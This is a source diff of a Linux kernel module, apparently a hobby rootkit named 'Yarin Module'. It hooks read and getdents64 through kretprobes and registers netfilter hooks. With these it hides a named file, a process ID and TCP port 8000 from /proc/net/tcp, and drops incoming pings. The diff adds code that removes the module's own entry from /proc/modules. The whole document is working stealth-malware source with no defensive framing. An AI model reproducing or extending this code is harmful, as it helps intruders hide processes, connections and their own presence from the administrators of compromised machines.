@@ -25,7 +25,7 @@
 /// const file name to hide
 const char* hide_file_name = "hideme";
 const int port_to_hide = 8000;
-const char* pid_to_hide = "/proc/3910";
+const char* pid_to_hide = "/proc/9704";
 const char selected_ip[4] = {192, 168, 1, 208};
 
 
@@ -97,7 +97,7 @@ static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs
 
 struct read_arguments {
     unsigned int fd;
-    void* buffer_ptr;
+    char* buffer_ptr;
     unsigned int count;
 };
 
@@ -115,7 +115,7 @@ static int read_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs
 
 //    //unsigned long syscall = regs->orig_ax;
     args->fd = regs->di; // 0
-    args->buffer_ptr = (void*)regs->si; // 1
+    args->buffer_ptr = (char*)regs->si; // 1
     args->count = regs->dx; // 2
 
     return 0;
@@ -145,44 +145,87 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
 
 
     // intercepting only /proc/net/tcp or /proc/pid/net/tcp
-    if(strcmp(sb->s_id, "proc") == 0 && ends_with(path, "/net/tcp")){
-        char* row_start = args->buffer_ptr;
-        int new_length = 0;
-        for(int row = 0; *row_start != '\0' ; row++){
-            int row_length = 0;
+    if(strcmp(sb->s_id, "proc") == 0){
+        if(ends_with(path, "/net/tcp")){
+            char* row_start = args->buffer_ptr;
+            int new_length = 0;
+            for(int row = 0; *row_start != '\0' ; row++){
+                int row_length = 0;
 
-            // go to end of line
-            while(*(row_start + row_length) != '\n') ++row_length;
-            // skip \n
-            ++row_length;
+                // go to end of line
+                while(*(row_start + row_length) != '\n') ++row_length;
+                // skip \n
+                ++row_length;
 
-            if(row == 0){
-                // "Skip" first row
-                new_length += row_length;
-            } else {
-                int index = -1;
-                unsigned long address = -1;
-                unsigned short port = -1;        
-
-                int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
-                
-                if(result == 3){
-                    // writes line sequentially except line to hide, 
-                    // so when line needs to be hidden it will be overriden or ignore with the new length
-                    if(port != port_to_hide){
-                        strncpy(args->buffer_ptr + new_length, row_start, row_length);
-                        new_length += row_length;
-                    }  
-                } else{
-                    pr_warn("Cant Parse line \n");
+                if(row == 0){
+                    // "Skip" first row
                     new_length += row_length;
+                } else {
+                    int index = -1;
+                    unsigned long address = -1;
+                    unsigned short port = -1;
+
+                    int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
+
+                    if(result == 3){
+                        // writes line sequentially except line to hide,
+                        // so when line needs to be hidden it will be overriden or ignore with the new length
+                        if(port != port_to_hide){
+                            strncpy(args->buffer_ptr + new_length, row_start, row_length);
+                            new_length += row_length;
+                        }
+                    } else{
+                        pr_warn("Cant Parse line \n");
+                        new_length += row_length;
+                    }
+                }
+                row_start += row_length;
+            }
+
+            // read syscall returns the number of bytes it read
+            regs_set_return_value(regs, new_length);
+        }
+        else if(strcmp(path, "/modules") == 0){
+            int module_name_len = strlen(KBUILD_MODNAME);
+
+            char* delete_from_ptr = NULL;
+            int delete_length = -1;
+
+            {
+                char* current_ptr = args->buffer_ptr;
+                char* row_start_ptr = current_ptr;
+                const char* end_ptr = args->buffer_ptr + buffer_count;
+
+                while(current_ptr < end_ptr){
+                    // go to end of line
+                    while(*current_ptr != '\n') ++current_ptr;
+                    // skip \n
+                    ++current_ptr;
+
+                    int row_length = (int)(current_ptr - row_start_ptr);
+
+                    if(strncmp(row_start_ptr, KBUILD_MODNAME, module_name_len) == 0){
+                        delete_from_ptr = row_start_ptr;
+                        delete_length = row_length;
+                        break;
+                    }
+                    row_start_ptr = current_ptr;
                 }
             }
-            row_start += row_length;
+
+            if(delete_from_ptr){
+                pr_info("HIDING module %s\n", KBUILD_MODNAME);
+                int offset = (int)(delete_from_ptr - args->buffer_ptr);
+
+                // if not at end copy to override the line to hide
+                if(offset + delete_length != buffer_count){
+                    char *copy_from_ptr = delete_from_ptr + delete_length;
+                    unsigned long left_to_copy = buffer_count - offset - delete_length;
+                    strncpy(delete_from_ptr, copy_from_ptr, left_to_copy);
+                }
+                regs_set_return_value(regs, buffer_count - delete_length);
+            }
         }
-        
-        // read syscall returns the number of bytes it read
-        regs_set_return_value(regs, new_length);                    
     }
     return 0;
 }
@@ -254,7 +297,7 @@ static unsigned int netfilter_ip_hook_func(void *priv, struct sk_buff *skb, cons
             // ping
             if (icmp->type == ICMP_ECHO)
             {
-                pr_info("Found Ping %lX %lX\n", ip_source, my_ip);
+                pr_info("Dropping PING %pI4\n", &ip_source);
                 return NF_DROP;
             }
         }
@@ -327,7 +370,8 @@ static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, c
 
 
 
-static struct nf_hook_ops net_hooks[2] = {
+static const int net_hook_count = 2;
+static struct nf_hook_ops net_hooks[] = {
     {
         .hook = netfilter_ip_hook_func,
         .hooknum = NF_INET_PRE_ROUTING,
@@ -375,7 +419,7 @@ static int __init entrypoint(void)
         return -1;
     }
 
-    if(nf_register_net_hooks(&init_net, net_hooks, 2) < 0){
+    if(nf_register_net_hooks(&init_net, net_hooks, net_hook_count) < 0){
         pr_info("nf_register_net_hook failed\n");
         return -1;
     }
@@ -399,7 +443,7 @@ static void __exit cleanup(void){
     unregister_kretprobe(&getdents64_kret_probe);
     unregister_kretprobe(&read_kret_probe);
     unregister_kretprobe(&newfstatat_kret_probe);
-    nf_unregister_net_hooks(&init_net, net_hooks, 2);
+    nf_unregister_net_hooks(&init_net, net_hooks, net_hook_count);
 
     pr_info("Yarin Module cleanup\n");
 }
